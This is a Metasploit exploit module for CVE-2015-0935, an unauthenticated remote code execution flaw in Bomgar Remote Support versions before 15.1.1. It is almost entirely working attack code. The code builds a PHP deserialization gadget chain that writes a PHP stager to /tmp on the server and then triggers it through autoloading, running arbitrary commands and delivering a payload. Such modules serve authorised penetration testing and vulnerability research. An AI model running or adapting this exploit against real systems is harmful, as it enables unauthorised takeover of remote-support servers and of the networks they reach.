##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
 
  def initialize
    super(
      'Name'           => 'Bomgar Remote Support Unauthenticated Code Execution',
      'Description'    => %q{
        This module exploits a vulnerability in the Bomgar Remote Support, which
        deserializes user provided data using PHP's `unserialize` method.
        By providing an specially crafted PHP serialized object, it is possible
        to write arbitrary data to arbitrary files. This effectively allows the
        execution of arbitrary PHP code in the context of the Bomgar Remote Support
        system user.
 
        To exploit the vulnerability, a valid Logging Session ID (LSID) is required.
        It consists of four key-value pairs (i. e., 'h=[...];l=[...];m=[...];t=[...]')
        and can be retrieved by an unauthenticated user at the end of the process
        of submitting a new issue via the 'Issue Submission' form.
 
        Versions before 15.1.1 are reported to be vulnerable.
      },
      'Author'         =>
        [
          'Markus Wulftange',
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => 'May 5 2015',
      'References'     =>
        [
          ['CWE', '94'],
          ['CWE', '502'],
          ['CVE', '2015-0935'],
          ['US-CERT-VU', '978652'],
          ['URL', 'http://codewhitesec.blogspot.com/2015/05/cve-2015-0935-bomgar-remote-support-portal.html'],
        ],
      'Privileged'     => false,
      'Targets'        =>
        [
          [ 'Linux x86',
            {
              'Platform'        => 'linux',
              'Arch'            => ARCH_X86,
              'CmdStagerFlavor' => [ :echo, :printf ]
            }
          ],
          [ 'Linux x86_64',
            {
              'Platform'        => 'linux',
              'Arch'            => ARCH_X86_64,
              'CmdStagerFlavor' => [ :echo, :printf ]
            }
          ]
        ],
      'DefaultTarget'  => 0,
      'DefaultOptions' =>
        {
          'RPORT'      => 443,
          'SSL'        => true,
          'TARGETURI'  => '/session_complete',
        },
    )
 
    register_options(
      [
        OptString.new('LSID', [true, 'Logging Session ID']),
      ], self.class
    )
  end
 
  def check
    version = detect_version
 
    if version
      print_status("Version #{version} detected")
      if version < '15.1.1'
        return Exploit::CheckCode::Appears
      else
        return Exploit::CheckCode::Safe
      end
    end
 
    print_status("Version could not be detected")
    return Exploit::CheckCode::Unknown
  end
 
  def exploit
    execute_cmdstager
 
    handler
  end
 
  def execute_command(cmd, opts)
    tmpfile = "/tmp/#{rand_text_alphanumeric(10)}.php"
 
    vprint_status("Uploading payload to #{tmpfile} ...")
    upload_php_file(tmpfile, generate_stager_php(cmd))
 
    vprint_status("Triggering payload in #{tmpfile} ...")
    execute_php_file(tmpfile)
  end
 
  def detect_version
    res = send_request_raw(
      'uri' => '/'
    )
 
    if res and res.code == 200 and res.body.to_s =~ /<!--Product Version: (\d+\.\d+\.\d+)-->/
      return $1
    end
  end
 
  def upload_php_file(filepath, data)
    send_pso(generate_upload_file_pso(filepath, data))
  end
 
  def execute_php_file(filepath)
    send_pso(generate_autoload_pso(filepath))
  end
 
  def send_pso(pso)
    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => normalize_uri(target_uri.path),
      'vars_post' => {
        'lsid'    => datastore['LSID'],
        'survey'  => pso,
      }
    )
 
    if res
      if res.code != 200
        fail_with(Failure::UnexpectedReply, "Unexpected response from server: status code #{res.code}")
      end
      if res.body.to_s =~ />ERROR: ([^<>]+)</
        fail_with(Failure::Unknown, "Error occured: #{$1}")
      end
    else
      fail_with(Failure::Unreachable, "Error connecting to the remote server") unless successful
    end
 
    res
  end
 
  def generate_stager_php(cmd)
    "<?php unlink(__FILE__); passthru('#{cmd.gsub(/[\\']/, '\\\\\&')}');"
  end
 
  def generate_upload_file_pso(filepath, data)
    log_file = PHPObject.new(
      "Log_file",
      {
        "_filename"   => filepath,
        "_lineFormat" => "",
        "_eol"        => data,
        "_append"     => false,
      }
    )
    logger = PHPObject.new(
      "Logger",
      {
        "\0Logger\0_logs" => [ log_file ]
      }
    )
    tracer = PHPObject.new(
      "Tracer",
      {
        "\0Tracer\0_log" => logger
      }
    )
 
    serialize(tracer)
  end
 
  def generate_autoload_pso(filepath)
    object = PHPObject.new(
      filepath.chomp('.php').gsub('/', '_'),
      {}
    )
 
    serialize(object)
  end
 
  class PHPObject
    attr_reader :name, :members
 
    def initialize(name, members)
      @name = name
      @members = members
    end
  end
 
  def serialize(value)
    case value.class.name.split('::').last
      when 'Array' then serialize_array_numeric(value)
      when 'Fixnum' then serialize_integer(value)
      when 'Float' then serialize_double(value)
      when 'Hash' then serialize_array_assoc(value)
      when 'Nil' then serialize_nil
      when 'PHPObject' then serialize_object(value)
      when 'String' then serialize_string(value)
      when 'TrueClass', 'FalseClass' then serialize_boolean(value)
      else raise "Value of #{value.class} cannot be serialized"
    end
  end
 
  def serialize_array_numeric(a)
    "a:#{a.size}:{" + a.each_with_index.map { |v, i|
      serialize_integer(i) + serialize(v)
    }.join + "}"
  end
 
  def serialize_array_assoc(h)
    "a:#{h.size}:{" + h.each_pair.map { |k, v|
      serialize_string(k) + serialize(v)
    }.join + "}"
  end
 
  def serialize_boolean(b)
    "b:#{b ? '1' : '0'};"
  end
 
  def serialize_double(f)
    "d:#{f};"
  end
 
  def serialize_integer(i)
    "i:#{i};"
  end
 
  def serialize_null
    "N;"
  end
 
  def serialize_object(o)
    "O:#{serialize_string(o.name)[2..-2]}:#{serialize_array_assoc(o.members)[2..-1]}"
  end
 
  def serialize_string(s)
    "s:#{s.size}:\"#{s}\";"
  end
 
end